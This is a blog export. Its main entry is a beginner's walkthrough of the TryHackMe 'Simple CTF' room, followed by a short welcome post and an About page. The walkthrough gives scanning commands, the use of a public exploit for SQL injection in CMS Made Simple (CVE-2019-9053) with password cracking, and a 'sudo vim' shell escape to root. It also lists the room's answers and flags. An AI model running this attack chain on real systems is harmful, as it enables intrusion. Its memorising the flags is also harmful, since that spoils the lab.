content:
Introduction Before we start, I need to say that this is my first ever writeup and also my first CTF, so I hope you enjoy it.
For a working environment, you can go to simple ctf and run the machine. You can use your own machine as an attack box using OpenVPN, or you can just stick to the attack box provided in the room for a simple setup like I did. Now let’s start.
Scanning nmap -sCV MACHINE_IP How many services are running under port 1000?
2
What is running on the higher port?
ssh
Initial Access So now from scanning we know that the server is running three services (ssh, ftp, http), and Anonymous FTP login is allowed.
Let’s start with http:
If we check http://MACHINE_IP in the browser, we found nothing but the default Apache web page.
We need to go deeper. We can use gobuster to check for subdirectories.
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/big.txt We found a subdirectory called /simple/. Now if we go to the URL, we see this page.
A little bit of research on the page and we found that this website uses a CMS called “CMS Made Simple”, so maybe we can exploit that.
If we check exploit database, we found a CVE.
What’s the CVE you’re using against the application?
CVE-2019-9053
To what kind of vulnerability is the application vulnerable?
sqli
So we’re gonna use this CVE to exploit the site. The script provided in the PoC is Python 2. We’re gonna use a new version, Python 3.
Updated version of the exploit script:
git clone https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3.git cd CVE-2019-9053-Exploit-Python-3/ pip install -r requirement.txt Now we are ready to crack the system.
python3 csm_made_simple_injection.py -u http://MACHINE_IP/simple -w /usr/share/wordlists/rockyou.txt --crack Run the script and wait. Yay, we done it! We get the password and username.
What’s the password?
secret
Where can you login with the details obtained?
ssh
Now using the username and password we discovered, we can now try to SSH into the target machine.
What’s the user flag?
G00d j0b, keep up!
Is there any other user in the home directory? What’s its name?
sunbath
Privilege Escalation sudo -l Note: sudo -l lists what commands the current user is allowed to run with sudo privileges
What can you leverage to spawn a privileged shell?
vim
sudo vim -c '!sh' What’s the root flag?
W3ll d0n3. You made it!
And that’s it, we made it! I hope you enjoyed this writeup.
summary: My first CTF writeup! Complete walkthrough of TryHackMe’s Simple CTF - exploiting CMS Made Simple SQLi vulnerability and escalating privileges with vim.
title: Simple CTF TryHackMe

content: Welcome to my blog, This is my first POST.
summary: Welcome to my blog, This is my first POST.
title: Hello World

content:
Hi, I’m Rachid Welcome to my blog! This is my digital notebook where I document my journey learning cybersecurity, penetration testing, and solving CTF challenges.
What You’ll Find Here CTF Writeups: Detailed solutions to Capture The Flag challenges Pentesting Labs: Walkthroughs of practice machines (HTB, THM, etc.) Learning Notes: Things I discover while studying security topics Tools & Techniques: Security tools and methodologies I’m exploring Why I Write I believe in learning in public. Writing helps me:
Solidify my understanding Create a reference for future me Help others who are on the same path All content on this blog is for educational purposes only.
title: About
